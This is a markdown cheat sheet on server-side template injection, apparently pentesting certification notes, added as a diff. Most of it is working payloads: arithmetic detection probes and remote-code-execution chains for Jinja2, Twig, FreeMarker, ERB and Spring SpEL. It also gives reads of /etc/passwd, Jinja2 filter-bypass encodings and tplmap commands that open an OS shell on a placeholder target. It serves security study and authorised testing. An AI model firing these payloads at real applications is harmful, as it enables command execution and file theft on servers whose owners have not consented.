@@ -1,0 +1,196 @@
+# Server-Side Template Injection (SSTI)
+
+> SSTI occurs when user input is embedded in a template and executed by the template engine, leading to RCE.
+
+---
+
+## 🔍 Detection - Universal Polyglot
+
+```
+{{7*7}}          -> 49  (Jinja2, Twig)
+${7*7}           -> 49  (FreeMarker, Thymeleaf)
+<%= 7*7 %>       -> 49  (ERB - Ruby)
+#{7*7}           -> 49  (Pebble)
+*{7*7}           -> 49  (Spring)
+{{7*'7'}}        -> 7777777 (Jinja2)
+                 -> 49 (Twig)
+```
+
+---
+
+## 🗺️ Template Engine Identification
+
+```
+{{7*7}}     = 49  → likely Jinja2 or Twig
+{{7*'7'}}   = 49  → Twig
+{{7*'7'}}   = 7777777 → Jinja2
+${7*7}      = 49  → FreeMarker / Thymeleaf
+<%= 7*7 %>  = 49  → ERB (Ruby)
+#{7*7}      = 49  → Pebble / Ruby EL
+```
+
+---
+
+## 🐍 Jinja2 (Python/Flask)
+
+```python
+# Detection
+{{7*7}}
+{{config}}
+{{config.items()}}
+
+# RCE - Method 1
+{{''.__class__.__mro__[1].__subclasses__()}}
+
+# Find subprocess.Popen index (look for it in the list)
+{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()}}
+
+# RCE - Method 2 (cleaner)
+{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
+
+# RCE - Simple
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
+
+# Read file
+{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}
+
+# Config dump (may expose secret key)
+{{ config }}
+```
+
+---
+
+## 🌿 Twig (PHP)
+
+```php
+# Detection
+{{7*7}}
+{{7*'7'}}  -> 49
+
+# RCE
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+
+# System command
+{{['id']|filter('system')}}
+{{['cat /etc/passwd']|filter('system')}}
+
+# PHP functions
+{{_self.env.registerUndefinedFilterCallback("passthru")}}
+{{_self.env.getFilter("id")}}
+```
+
+---
+
+## ♦️ FreeMarker (Java)
+
+```java
+# Detection
+${7*7}
+
+# RCE
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
+
+# Using ObjectConstructor
+${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder",["id"]).start()?api.text}
+```
+
+---
+
+## 💎 ERB (Ruby)
+
+```ruby
+# Detection
+<%= 7*7 %>
+
+# RCE
+<%= system('id') %>
+<%= `id` %>
+<%= IO.popen('id').readlines() %>
+```
+
+---
+
+## 🌱 Spring (Java - SpEL)
+
+```java
+# Detection
+*{7*7}
+${7*7}
+
+# RCE
+*{T(java.lang.Runtime).getRuntime().exec('id')}
+${T(java.lang.Runtime).getRuntime().exec(new String[]{"id"})}
+```
+
+---
+
+## 🚫 SSTI Filter Bypass
+
+```python
+# Jinja2 filter bypass
+
+# Bypass dots using |attr()
+{{request|attr('application')}}
+
+# Bypass underscore using request.args
+# URL: /?x=__class__
+{{request.args.x}}
+
+# Bypass using hex encoding
+{{'\x5f\x5fclass\x5f\x5f'}}
+
+# Bypass using format string
+{{'%s%s%s%s%s%s'|format('_','_','clas','s_','_')}}
+```
+
+---
+
+## 🛠️ Tools
+
+```bash
+# tplmap - automated SSTI detection and exploitation
+python3 tplmap.py -u "https://target.com/page?name=test"
+python3 tplmap.py -u "https://target.com/page?name=test" --os-shell
+python3 tplmap.py -u "https://target.com/page?name=test" --os-cmd "id"
+
+# Burp Suite - manual testing
+# SSTImap - alternative to tplmap
+```
+
+---
+
+## 📋 SSTI Testing Checklist
+
+- [ ] Test `{{7*7}}` in all input fields
+- [ ] Test `${7*7}` for Java-based templates
+- [ ] Test `<%= 7*7 %>` for Ruby
+- [ ] Test in URL parameters, form fields, headers
+- [ ] Check error messages for template engine name
+- [ ] Try to read /etc/passwd
+- [ ] Escalate to RCE
+- [ ] Check if output is reflected in response
+- [ ] Test in email templates
+- [ ] Test in PDF generators
+
+---
+
+## 🧠 eWPTXv3 Tips
+
+- **Email templates** are a common SSTI location
+- **Error pages** often use templates — test 404/500 pages
+- **Sandbox escape** needed in some Jinja2 implementations
+- Check **profile/account name** fields — often template rendered
+- `tplmap` is your best friend for automation
+- If you see `49` in response after `{{7*7}}` — you have SSTI!
+
+---
+
+## 📚 References
+
+- [PortSwigger SSTI Labs](https://portswigger.net/web-security/server-side-template-injection)
+- [PayloadsAllTheThings SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
+- [HackTricks SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
+
+---
+
+*Notes by [@mtsboy01](https://github.com/mtsboy01) | MTS-SECURITY*
